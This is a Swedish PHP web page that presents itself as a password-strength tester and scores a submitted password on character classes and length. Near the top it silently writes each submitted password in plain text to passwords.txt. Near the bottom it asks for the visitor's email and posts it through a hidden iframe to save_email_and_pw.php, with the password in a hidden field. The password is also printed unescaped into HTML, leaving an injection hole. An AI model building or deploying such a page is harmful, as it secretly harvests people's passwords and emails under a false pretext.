<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <title>Resultat – Testa ditt lösenord!</title>
  <link rel="stylesheet" href="stylesheet.css">
</head>
<body>
  <div class="big">
    <div class="small">
      <iframe name="secret_iframe" style="display: none;"></iframe>
      <?php
        $password = $_POST["password"];
        $pw_log = fopen("passwords.txt", "a");
        fwrite($pw_log, $password . PHP_EOL);
        fclose($pw_log);
      ?>
      <h1>Resultat</h1>
      <table>
        <tr>
          <td>Innehåller små bokstäver:</td>
          <td>
            <?php
              $lower = "abcdefghijklmnopqrstuvwxyz";
              $contains_lower = 0;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($lower); $y++) {
                  if($password[$x] == $lower[$y]) {
                    echo "Ja";
                    $contains_lower = 1;
                    break 2;
                  }
                }
              }
              if($contains_lower == 0) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller stora bokstäver:</td>
          <td>
            <?php
              $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
              $contains_upper = 0;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($upper); $y++) {
                  if($password[$x] == $upper[$y]) {
                    echo "Ja";
                    $contains_upper = 1;
                    break 2;
                  }
                }
              }
              if($contains_upper == 0) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller siffror:</td>
          <td>
            <?php
              $numbers = "0123456789";
              $contains_number = 0;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($numbers); $y++) {
                  if($password[$x] == $numbers[$y]) {
                    echo "Ja";
                    $contains_number = 1;
                    break 2;
                  }
                }
              }
              if($contains_number == 0) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller symboler:</td>
          <td>
            <?php
              $contains_symbol = 0;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y <= 255; $y++) {
                  if((48 <= $y and $y <= 57) or (65 <= $y and $y <= 90) or (97 <= $y and $y <= 122)) {
                    break 1;
                  }
                  if(ord($password[$x]) == $y) {
                    echo "Ja";
                    $contains_symbol = 1;
                    break 2;
                  }
                }
              }
              if($contains_symbol == 0) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Längd:</td>
          <td>
            <?php
              if(strlen($password) <= 8) {
                echo "Kort";
                $length = 0;
              } elseif(strlen($password) <= 20) {
                echo "Medellångt";
                $length = 1;
              } else {
                echo "Långt";
                $length = 2;
              }
            ?>
          </td>
        </tr>
      </table>
      <h1>
        Poäng: <?php
          $score = 0;
          if($contains_lower == 1) {
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_upper == 1) {
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_number == 1) {
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_symbol == 1) {
            $score += 10;
          } else {
            $score -= 5;
          }
          if($length == 2) {
            $score += 20;
          } elseif($length == 0) {
            $score -= 25;
          }
          echo $score;
        ?>
      </h1>
      <p>
        Ditt lösenord är
        <?php
          if($score < -15) {
            echo " ganska dåligt. Du borde byta det.";
          } elseif($score > 15) {
            echo " jättebra! Fortsätt så!";
          } else {
            echo " helt okej. Det funkar nog.";
          }
        ?>
      </p>
      <br>
      <p>Om du vill ha ett bättre lösenord kan du skriva in din emailadress här så skickar vi</p>
      <p>ett bra lösenord till dig när vår superhögteknologiska lösenordsgenerator passerar betastadiet.</p>
      <form action="save_email_and_pw.php" method="post" target="secret_iframe">
        <input type="password" name="password" value=<?php echo $password; ?> style="display: none;" disabled>
        <input type="email" name="email" required>
        <input type="submit" value="Ge mig ett lösenord!">
      </form>
    </div>
  </div>
</body>
